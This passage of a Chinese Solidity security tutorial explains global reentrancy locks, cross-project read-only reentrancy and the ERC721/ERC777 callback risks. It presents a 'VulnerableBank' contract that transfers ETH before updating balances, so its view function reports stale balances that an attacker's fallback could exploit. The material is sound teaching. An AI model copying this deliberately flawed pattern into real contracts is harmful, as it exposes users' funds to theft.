> 这个合约提供了一种全局重入保护机制，确保合约在执行特定功能时不会被重入。与常见的重入保护不同，它使用一个外部 `DataStore` 合约来存储重入状态，从而允许多个合约共享同一个重入锁。这种设计使得不同合约之间的重入状态得以隔离和管理。
>
> ### 安全性注意事项
>
> 1. **数据存储的可靠性**:
>    - `DataStore` 合约的安全性至关重要，任何漏洞都可能导致重入攻击的成功。因此，确保该合约的实现无误且安全是非常重要的。
>
> 2. **测试和审计**:
>    - 使用重入锁时，必须进行充分的测试和审计，以确保没有其他潜在的攻击向量。
>
> 3. **复杂性增加**:
>    - 使用外部数据存储可能增加系统的复杂性，开发人员需要注意管理和维护这些状态的正确性。

一句话概括这个全局重入锁的核心就是，建立一个单独的合约用来储存重入状态，然后，在你的系统里的任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态，这样你的所有合约就都被重入保护起来了。

看似美妙，但还没完... 攻击者还有更新的花招即便是用全局重入锁也无法防范的。接着往下看: ...

## 3. 跨项目重入攻击

越写越大了。。。所谓跨项目的重入攻击，其核心与上面两例其实也是比较类似。本质就是趁某项目合约的某个状态变量在还未来得及更新时，就利用接手的执行权来发起外部函数调用。如果有第三方合作项目的合约是依赖于前面提到的项目合约里这个状态变量的值来做某些决策的，那么攻击者就可以去攻击这个合作项目的合约，因为在此刻它读到的是一个过期的状态值，会导致它执行一些错误的行为令攻击者获利。 通常，合作项目的合约通过一些`getter`函数或其他公开的只读函数的调用来传递信息，所以这类攻击也通常体现为`只读重入攻击 Read-Only Reentrancy`。

请看如下示例代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract VulnerableBank {
  mapping(address => uint256) public balances;

  uint256 private _status; // 重入锁

  // 重入锁
  modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
       require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
      _status = 1;
      _;
      // 调用结束，将 _status 恢复为0
      _status = 0;
  }

  function deposit() external payable {
    require(msg.value > 0, "Deposit amount must ba greater than 0");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Withdrawal amount must be greater than 0");
    require(isAllowedToWithdraw(msg.sender, _amount), "Insufficient balance");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Withdraw failed");

    balances[msg.sender] -= _amount;
  }

  function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) {
    return balances[_user] >= _amount;
  }
}
```



如代码所示，在这个合约中，已经没有攻击者发挥重入的空间了。然而，这里没有，不代表别处没有。。。 我们可以看到合约里有一个公开的只读函数`isAllowedToWithdraw`，这类函数就是用来以提供信息为目的的。很多项目的合约里都或多或少有一些这类函数，而这类函数又常被其他项目的合约来调用获取信息，最终完成Defi世界里的一个乐高积木。可以看到这个重要的`withdraw`函数已经被上了锁，不可以重入攻击，但是在他的执行过程中的`ETH`转账那一步，`ETH`刚刚转出，假设攻击者想要此刻调用`isAllowedToWithdraw`函数，可以预见即便是`_amount`数值很大，攻击者的存款实际已被掏空，但返回值仍然是`true`因为账本在此刻还没有更新。那么，攻击者就可以在他的恶意合约里的`fallback`函数中设置外部函数调用,去攻击他已知的其他项目的依据`isAllowedToWithdraw`函数返回结果来制定操作的那些合约。

上面这个合约本身不遭攻击，而合作伙伴的合约遭到攻击。。。典型的：

*“我不杀伯仁，伯仁却因我而死...” -- 戴锁婆婆*

针对`Read-Only Reentrancy`, [Euler Finance](https://github.com/euler-xyz/euler-contracts/commit/91adeee39daf8ece00584b6f7ec3e60a1d226bc9#diff-05f47d885ccf959493d5c53203672966544d73232f5410184d5484a7aedf0c5eR260)采用`read-only reentrancy guard`，仅当未加锁时才能进行读取。同时，锁的可见性可以设置为`public`以供其他项目使用。

## 4. ERC721 & ERC777 Reentrancy

这两种代币标准都各自规定了一个回调函数：

ERC721: `function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);`

ERC777: `function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;`

有回调函数的存在就有接手代码执行权的机会，同时也会营造出重入攻击的可能性。对这一情况就不展示代码示例了，因为结合上述几个案例，这一条现在应该很容易理解了。并且，实在是能够玩出无穷花样。

> [!TIP]
>
> **回调函数**是一种特殊类型的函数，通常在合约间进行交互时被自动调用。它允许合约在特定事件发生时执行某些操作，通常是在另一个合约执行某个操作之后。回调函数的存在使得合约之间能够进行更复杂的交互，同时也为开发者提供了灵活性。然而，这种机制也可能引发安全问题，例如**重入攻击**。
>
> ### 回调函数的工作原理
>
> 在智能合约的上下文中，回调函数的工作流程如下：
>
> 1. **合约A调用合约B**：当合约A调用合约B的某个函数时，合约B可以在函数执行完成后调用合约A的回调函数。
> 2. **执行回调**：合约B执行完其逻辑后，会通过调用合约A的回调函数，将控制权交还给合约A，并传递相关参数。
> 3. **继续执行**：合约A的回调函数接收参数并执行自定义逻辑。
>
> ### 示例：ERC721和ERC777的回调函数
>
> - **ERC721的回调函数**：
>
>     ```solidity
>     function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);
>     ```
>
>     - 此函数在一个ERC721代币被安全转移到合约时被调用。
>     - 它接收四个参数：操作者地址、发送者地址、代币ID和附加数据。
>     - 如果合约成功处理了代币的接收，可以返回一个特定的字节值（`bytes4`），以表明该合约可以安全地接收代币。
>
> - **ERC777的回调函数**：
>
>     ```solidity
>     function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;
>     ```
>
>     - 此函数在ERC777代币转移时被调用。
>     - 它接收多个参数，包括操作者地址、发送者地址、接收者地址、转移的代币数量、用户数据和操作者数据。
>     - 这允许合约在接收代币时进行额外的逻辑处理。
>
> ### 重入攻击的风险
>
> 回调函数为重入攻击提供了可能性。在重入攻击中，攻击者通过在合约的回调函数中重新调用同一合约的某个函数，试图重复执行某些操作。以下是一个简要的解释：
>
> 1. **状态未更新**：如果合约在转账前未更新其内部状态（例如余额），攻击者可以利用这一点，在回调中重复调用原来的函数。
> 2. **控制权交接**：在调用过程中，控制权被交给了攻击者的合约，使得攻击者可以在合约的状态未更新的情况下，再次执行导致资金转移的操作。
>
> ### 结论
>
> 回调函数在智能合约中是非常有用的工具，可以实现复杂的交互。然而，它们也引入了重入攻击等安全风险。因此，开发者在设计合约时需要谨慎，确保采用适当的安全措施（如检查-影响-交互模式），以防止潜在的攻击。



## 总结

至此，我们审阅了几个实际发生的，各种花样的重入攻击的逻辑本体和它们的简易代码，相信各位同学应该不难看出，这些合约被攻击，是由于它们都共有一个缺陷。那就是这些合约的设计对于重入攻击的防范，都太过于依赖一个直截了当的工具（重入锁）的保护，而没有贯彻另一条良好的设计习惯 *检查-影响-交互模式* 。 简单的工具永远不会是完美防御，贯彻的方法论才是你永远的后盾 *（报告首长，本节代码课的思政任务已传达，请验收）*

所以，对于使用小工具，还是使用方法论的取舍，我们作为solidity devs，答案我想应该是：既要...又要...！从跨函数的攻击，再到跨合约，跨项目的攻击，若是要求devs和auditors记住这越来越庞大的乐高之间的千丝万缕的联系，实在是有些强人所难。于是，在构造过程中的每一步，都标准地布置多道不同防御机制，便能省心地获得更好的结果。



![img](https://www.wtf.academy/assets/images/S17-1-caaa5327c04797f1b0bf9045491eebcd.png)